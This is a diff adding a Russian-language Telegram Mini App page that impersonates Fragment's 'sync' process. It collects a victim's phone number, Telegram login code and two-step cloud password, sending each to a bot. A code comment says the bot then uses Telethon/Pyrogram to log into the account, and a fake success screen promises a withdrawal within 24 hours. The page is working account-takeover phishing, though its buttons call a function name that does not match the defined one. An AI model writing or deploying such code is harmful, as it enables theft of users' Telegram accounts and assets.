@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Fragment Sync</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { font-family: -apple-system, system-ui, sans-serif; background: #f4f4f5; margin: 0; display: flex; justify-content: center; padding-top: 20px; }
+        .container { width: 90%; max-width: 400px; background: white; padding: 25px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; }
+        .logo { width: 80px; margin-bottom: 15px; }
+        h2 { font-size: 20px; color: #222; margin-bottom: 10px; }
+        p { font-size: 14px; color: #707579; line-height: 1.4; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #dfe1e5; border-radius: 10px; box-sizing: border-box; font-size: 16px; outline: none; transition: border 0.3s; }
+        input:focus { border-color: #3390ec; }
+        button { width: 100%; padding: 14px; background: #3390ec; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .loader { display: none; border: 3px solid #f3f3f3; border-top: 3px solid #3390ec; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .step { display: none; }
+        .step.active { display: block; }
+        .success-icon { color: #34c759; font-size: 50px; margin-bottom: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://fragment.com/img/logo.svg" class="logo">
+    
+    <div id="step1" class="step active">
+        <h2>Синхронизация Fragment</h2>
+        <p>Для разблокировки вывода Stars и NFT подтвердите владение аккаунтом.</p>
+        <input type="tel" id="phone" placeholder="+7 (999) 000-00-00">
+        <button onclick="sendData(1)">Подтвердить номер</button>
+    </div>
+
+    <div id="step2" class="step">
+        <h2>Введите код</h2>
+        <p>Код подтверждения отправлен в ваш Telegram.</p>
+        <input type="number" id="code" placeholder="00000">
+        <button onclick="sendData(2)">Проверить код</button>
+    </div>
+
+    <div id="step3" class="step">
+        <h2>Облачный пароль</h2>
+        <p>Введите ваш пароль двухэтапной аутентификации.</p>
+        <input type="password" id="password" placeholder="Пароль">
+        <button onclick="sendData(3)">Завершить</button>
+    </div>
+
+    <div id="step4" class="step">
+        <div class="success-icon">✔</div>
+        <h2>Готово!</h2>
+        <p>Аккаунт успешно синхронизирован с Fragment. Ожидайте вывод средств в течение 24 часов.</p>
+        <button onclick="window.Telegram.WebApp.close()">Закрыть</button>
+    </div>
+
+    <div id="loader" class="loader"></div>
+</div>
+
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+
+    function nextStep(current) {
+        const loader = document.getElementById('loader');
+        const currentStepDiv = document.getElementById('step' + current);
+        
+        let dataToSend = { step: current };
+
+        // Собираем данные в зависимости от текущего шага
+        if (current === 1) {
+            dataToSend.phone = document.getElementById('phone').value;
+        } else if (current === 2) {
+            dataToSend.code = document.getElementById('code').value;
+        } else if (current === 3) {
+            dataToSend.password = document.getElementById('password').value;
+        }
+
+        // ОТПРАВЛЯЕМ ДАННЫЕ БОТУ МГНОВЕННО
+        // Бот получит сообщение и сможет начать работу с Telethon/Pyrogram
+        tg.sendData(JSON.stringify(dataToSend));
+
+        // Визуальное переключение шагов
+        currentStepDiv.classList.remove('active');
+        loader.style.display = 'block';
+
+        setTimeout(() => {
+            loader.style.display = 'none';
+            const next = current + 1;
+            const nextStepDiv = document.getElementById('step' + next);
+            if (nextStepDiv) {
+                nextStepDiv.classList.add('active');
+            }
+        }, 1500); // Небольшая задержка для вида "загрузки"
+    }
+</script>
+</body>
+</html>
